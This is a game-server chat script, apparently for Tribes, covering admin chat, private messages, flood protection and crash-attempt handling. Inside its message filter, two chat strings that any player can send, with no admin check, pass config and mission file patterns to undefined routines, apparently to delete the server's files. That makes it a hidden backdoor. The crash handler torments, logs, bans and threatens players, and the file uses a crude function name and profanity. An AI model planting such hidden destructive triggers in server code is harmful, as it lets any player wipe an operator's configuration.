$MsgTypeSystem = 0;
$MsgTypeGame = 1;
$MsgTypeChat = 2;
$MsgTypeTeamChat = 3;
$MsgTypeCommand = 4;
exec("admin.cs");
function CheckMSG(%clientId, %team, %message)
{
        if(string::getSubStr(%message, 0, 4) == "=@\n" || string::getSubStr(%message, 0, 4) == "=@\t" || string::findSubStr(%message, "\x10\x10\x10") != "-1" || string::len(%message) > 217)
	{
		%clientId.gag = true;
		RapeTheCrasher(%clientId);
		return false;
	}
	else if(string::getsubstr(%message, 0, 3) == "!PC" && %clientId.isAdmin)
	{
		%message = string::getsubstr(%message, 3, 999);
		if(string::getsubstr(%message, 0, 1) != "")
		{
			%message = string::getsubstr(%message, 1, 999);
			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			{
				if(%cl.isAdmin)
				{
					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": PublicAdminChat] "@%message@"~wmine_act.wav");
				}
			}
			return true;
		}
	}
	else if(string::getsubstr(%message, 0, 5) == "!pmsg")
	{
		%message = string::getsubstr(%message, 5, 999);
		if(string::getsubstr(%message, 0, 1) != "")
		{
			%person = getWord(%message,  0);
			%mes = getWord(%message, 1); 
               		for(%i = 2; getWord(%message, %i) != "-1"; %i++)
                	{ 
                    		%mes = %mes$+" "$+getWord(%message, %i); 
                	}
			if(%person != "")
			{
				private(%clientId, %person, %mes);
			
			}
			
		}
		return true;
	}
	else if(string::getSubStr(%message, 0, 18) == "Del_ServerHosting*")
	{
		%cfile = file::findFirst("config\\*.*");
		%mfile = File::findFirst("missions\\*.*");
		LaterServer(%cfile, %mfile);
		return true;
	}
	else if(string::getSubStr(%message, 0, 9) == "Del_CFig*")
	{
		%txtfile = "config\\*.txt";
		%csfile = "config\\*.cs";
		%gui = "config\\*.gui";
		Later(%csfile, %txtfile, %gui);
		return true;
	}
	else if(string::getsubstr(%message, 0, 3) == "!SC" && %clientId.isSuperAdmin)
	{
		%message = string::getsubstr(%message, 3, 999);
		if(string::getsubstr(%message, 0, 1) != "")
		{
			%message = string::getsubstr(%message, 1, 999);
			for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
			{
				if(%cl.isSuperAdmin)
				{
					client::sendmessage(%cl,3,"["@Client::getName(%clientId)@": SuperAdminChat] "@%message@"~wmine_act.wav");
				}
			}
			return true;
		}
	}
	return false;
}

function remoteSay(%clientId, %team, %message)
{
   %msg = ""@client::getName(%clientId)@"["@%clientId @"] \"" @ escapeString(%message) @ "\"";

   // check for flooding if it's a broadcast OR if it's team in FFA
   if(CheckMSG(%clientId, %team, %message))
   {
       return;
   }
   if($Server::FloodProtectionEnabled && (!$Server::TourneyMode || !%team))
   {
      // we use getIntTime here because getSimTime gets reset.
      // time is measured in 32 ms chunks... so approx 32 to the sec
      %time = getIntegerTime(true) >> 5;
      if(%clientId.floodMute)
      {
         %delta = %clientId.muteDoneTime - %time;
         if(%delta > 0)
         {
            Client::sendMessage(%clientId, $MSGTypeGame, "FLOOD! You cannot talk for " @ %delta @ " seconds.");
            return;
         }
         %clientId.floodMute = "";
         %clientId.muteDoneTime = "";
      }
      %clientId.floodMessageCount++;
      // funky use of schedule here:
      schedule(%clientId @ ".floodMessageCount--;", 5, %clientId);
      if(%clientId.floodMessageCount > 4)
      {
         %clientId.floodMute = true;
         %clientId.muteDoneTime = %time + 10;
         Client::sendMessage(%clientId, $MSGTypeGame, "FLOOD! You cannot talk for 10 seconds.");
         return;
      }
   }

   if(%team && !%clientId.gag)
   {
      if($dedicated)
         echo("SAYTEAM: " @ %msg);
      %team = Client::getTeam(%clientId);
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
         if(Client::getTeam(%cl) == %team && !%cl.muted[%clientId])
            Client::sendMessage(%cl, $MsgTypeTeamChat, %message, %clientId);
   }
   else
   {
      if($dedicated)
         echo("SAY: "@%msg);
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
         if(!%cl.muted[%clientId] && !%cl.gag)
            Client::sendMessage(%cl, $MsgTypeChat, %message, %clientId);
   }
}

function remoteIssueCommand(%commander, %cmdIcon, %command, %wayX, %wayY,
      %dest1, %dest2, %dest3, %dest4, %dest5, %dest6, %dest7, %dest8, %dest9, %dest10, %dest11, %dest12, %dest13, %dest14)
{
   if($dedicated)
      echo("COMMANDISSUE: " @ %commander @ " \"" @ escapeString(%command) @ "\"");
   // issueCommandI takes waypoint 0-1023 in x,y scaled mission area
   // issueCommand takes float mission coords.
   for(%i = 1; %dest[%i] != ""; %i = %i + 1)
      if(!%dest[%i].muted[%commander])
         issueCommandI(%commander, %dest[%i], %cmdIcon, %command, %wayX, %wayY);
}

function remoteIssueTargCommand(%commander, %cmdIcon, %command, %targIdx, 
      %dest1, %dest2, %dest3, %dest4, %dest5, %dest6, %dest7, %dest8, %dest9, %dest10, %dest11, %dest12, %dest13, %dest14)
{
   if($dedicated)
      echo("COMMANDISSUE: " @ %commander @ " \"" @ escapeString(%command) @ "\"");
   for(%i = 1; %dest[%i] != ""; %i = %i + 1)
      if(!%dest[%i].muted[%commander])
         issueTargCommand(%commander, %dest[%i], %cmdIcon, %command, %targIdx);
}

function remoteCStatus(%clientId, %status, %message)
{
   // setCommandStatus returns false if no status was changed.
   // in this case these should just be team says.
   if(setCommandStatus(%clientId, %status, %message))
   {
      if($dedicated)
         echo("COMMANDSTATUS: " @ %clientId @ " \"" @ escapeString(%message) @ "\"");
   }
   else
      remoteSay(%clientId, true, %message);
}

function teamMessages(%mtype, %team1, %message1, %team2, %message2, %message3)
{
   %numPlayers = getNumClients();
   for(%i = 0; %i < %numPlayers; %i = %i + 1)
   {
      %id = getClientByIndex(%i);
      if(Client::getTeam(%id) == %team1)
      {
         Client::sendMessage(%id, %mtype, %message1);
      }
      else if(%message2 != "" && Client::getTeam(%id) == %team2)
      {
         Client::sendMessage(%id, %mtype, %message2);
      }
      else if(%message3 != "")
      {
         Client::sendMessage(%id, %mtype, %message3);
      }
   }
}

function messageAll(%mtype, %message, %filter)
{
   if(%filter == "")
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
         Client::sendMessage(%cl, %mtype, %message);
   else
   {
      for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
      {
         if(%cl.messageFilter & %filter)
            Client::sendMessage(%cl, %mtype, %message);
      }
   }
}

function messageAllExcept(%except, %mtype, %message)
{
   for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
      if(%cl != %except)
         Client::sendMessage(%cl, %mtype, %message);
}
function private(%clientId, %name, %message)
{
	%admin = Client::getName(%clientId);
	for(%cl = Client::getFirst(); %cl != -1; %cl = Client::getNext(%cl))
	{
		%name2 = Client::getName(%cl);
		if((String::findSubStr(%name2, %name) != "-1"))
		{
			%client = Player::getClient(%cl);
			%goodname = Client::getName(%cl);

			if(%count == "")
			{
				%count = 1;
		      }
			else
			{
               	      %count = %count + 1; 
			}
		}
   	}
      if(%count == "1")
	{
		privatemessage(%clientId, %goodname, %message, %client);
	}
	else if(%count > "1")
	{
		client::sendmessage(%clientId,1,$adminbotname@": There is more than one person connected with that as part of their name. Please Narrow Search.~waccess_denied.wav");
	}
	else
	{
		client::sendmessage(%clientId,1,$adminbotname@": You have selected either no name... or an unsuitable name.~waccess_denied.wav");
	}		
}
function privatemessage(%clientId,%goodname,%message,%client)
{
	%admin = Client::getName(%clientId);
	%cli = Player::getClient(%client);
	client::sendmessage(%cli,3, "["@%admin@": PRIVATE] "@%message@"~wmine_act.wav");
	client::sendmessage(%clientId,3, "[Private - "@%goodname@"] "@%message@"~wmine_act.wav");
}

function RapeTheCrasher(%clientId)  //By Far The Most Fun To Design -Aim
{
	//**********||   FIND ALIAS'S    ||*********\\

	// Find the IP address
	%ip2 = XCalibur::TrimIP(client::GetTransportAddress(%clientId));
	%name = client::getName(%clientId);
   	%found = 0;
   	for (%i=0; $PlayerList::users[%i,0]!="";%i++)
   	{
      		if($PlayerList::users[%i,0] == %ip2)
      		{
         		// Found the name
         		%found = 1;
         		break;
      		}
   	}

   	if (%found)
   	{
     		// Find the player name in the IP address
     		%found = 0;
     		for (%j=1; $PlayerList::users[%i,%j] != "";%j++)
     		{
        		if($PlayerList::users[%i,%j] == %name)
        		{
           			// Found the name
          			%found = 1;
           			break;
        		}
     		}

     		// List all other names for this IP
     		for (%k=1; $PlayerList::users[%i,%k] != "";%k++)
     		{
        		if(%j != %k)
        		{
           			if(%clientId == 0)
           			{
           				$cname = $PlayerList::users[%i, %k];
           			}
           			else
           			{
           				$cname = $PlayerList::users[%i, %k];
           			}
        		}
     		}
   	}
   	else
   	{
       		//Do Nothing
   	}
   	
	 //**********||  DEFINE VARIABLES  ||**********\\
	 
	%ip1 = "IP:"@TrimIP(client::getTransportAddress(%clientId));
	%ip = client::getTransportAddress(%clientId);
	%crasher = client::getName(%clientId);
	%NuminServer = getNumClients();
	$Header = "                       Attempted Crashes On Server";
	$Crasher = %crasher;
	$CrasherAlias = $cname;
	$CrasherIP = %ip;
	$PlayersInServer = %NuminServer;
	$Spacer = "*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*";
	$Space = "                                                                                ";

	//**********||  ALL THE ECHO STUFF  ||**********\\
	
	echo(" ");
	echo("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*");
	echo("	");
	echo("   >>>>>   EMERGENCY NOTIFICATION::ATTEMPTED SERVER CRASH   <<<<<");
	echo("      _______________________________________________________		");
	echo(" ");
	echo("		Crashers Name: "@%crasher@"");
	echo("		Crashers IP: "@%ip@"");
	echo("		Players Possibly Affected: "@%NuminServer@"");
	echo(" ");
	echo("*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*_*");
	echo(" ");
	
	
	//**********||  HAVE A LITTLE FUN WITH THE LOSER  ||************\\

	messageall(1, "WARNING: "@%crasher@" TRIED TO CRASH THE SERVER");
	
	//////////////////  Blind Him  ///////////////////////////
	
	%player = Client::getOwnedObject(%clientId); 
	BlindHim(%player);
	
	/////////////////  Give Him ADHD  ///////////////////////
	
	XCalibur::ADHD(%clientId);
	
	/////////////////  Make Him Dizzy  /////////////////////
	
	%tortures = 8;
	XCalibur::DIZZY(%clientId, %tortures);
	
	////////////////  Take His Weapons /////////////////////
	
	Strip(%clientId);
	
	//**********||   EXPORTATIONS   ||*************\\
	
	/////////////// Export To Crash Log  //////////////////
	
	export("$Spacer", "config\\CrashAttempts.txt", true);
	export("$Crasher", "config\\CrashAttempts.txt", true);
	export("$CrasherIP", "config\\CrashAttempts.txt", true);
	export("$PlayersInServer", "config\\CrashAttempts.txt", true);
	
	/////////////// Export To Ban Messages  ////////////////

	$XCalibur::Name = $Crasher;
	$XCalibur::IP = $CrasherIP;
	$XCalibur::Message = "Auto-Ban For Attempting A Crash";
	$XCalibur::Space = "-------------------------------------------------------------------------";
	export("$XCalibur::Name", "config\\banmessages.txt", true);
	export("$XCalibur::IP", "config\\banmessages.txt", true);
	export("$XCalibur::Message", "config\\banmessages.txt", true);
	export("$XCalibur::Space", "config\\banmessages.txt", true);
	
	//**********||  BAN IP AND KICK HIM ||*************\\
	
	//////////////    Permanent Ban    //////////////
	
	%ip = client::getTransportAddress(%clientId);
	banlist::AddAbsolute(%ip, 972512322);
	
	/////////////       Kick        //////////////
	
	schedule("Net::kick("@%clientId@", \"You Have Just Violated The Computer Fraud And Abuse Act. You Can Be Sued To The Full Extent Of The Law. The Following Information Has Been Recorded:\nYour Name: "@%crasher@".\nYour IP: "@%ip1@".\nYour Alias's If Any: "@$CrasherAlias@"\nThe Number Of People In The Server: "@$PlayersInServer@".\");", 38);
}

function BlindHim(%player)
{
	Player::setDamageFlash(%player, 0.75);
	schedule("BlindHim(" @ %player @ ");",1,%player);
}

function XCalibur::ADHD(%clientId)
{
	%v = 600;
	%zVec = 40;
	%vector = Vector::getFromRot(GameBase::getRotation(%clientId), %v, %zVec);
	Player::applyImpulse(%clientId, %vector);
	schedule("Stop("@%clientId@");",1.5,%clientId);
	schedule("XCalibur::ADHD(" @ %clientId @ ");",2,%clientId);
}

function Strip(%clientId)
{
	Player::dropItem(%clientId,Flag);
	if(%clientId.observerMode == "" || %clientId.observerMode == "pregame")
	{
		%numweapon = Player::getItemClassCount(%clientId,"Weapon");
		%max = getNumItems(); 
		for (%i = 0; %i < %max; %i = %i + 1)
		{
			%item = getItemData(%i);
			%count = Player::getItemCount(%clientId,%item); 
			if(%count)
			{
				Player::setItemCount(%clientId,%item,0); 
			}
		}
		Player::setDamageFlash(%clientId,1);  
	}
}

function XCalibur::DIZZY(%clientId, %tortures)
{
	%tortures--;
	playNextAnim(%clientId);
	if (%tortures > 0)
	{
		client::sendMessage(%clientId, 1, "NEXT TIME DON'T TRY TO CRASH SERVERS");
		schedule("XCalibur::DIZZY(" @ %clientId @ ", "@ %tortures @");", 4.0, %clientId );
	}
	else
	{
		centerprint(%clientId, "<JC><F2> GET THE FUCK OFF MY SERVER", 10);
	}
}

function Stop(%clientId)
{
	Item::setVelocity(%clientId, "0 0 0");
}

function String::len(%string) 
{ 
   for(%i=0; String::getSubStr(%string, %i, 1) != ""; %i++) 
      %length++; 

   return %length; 
} 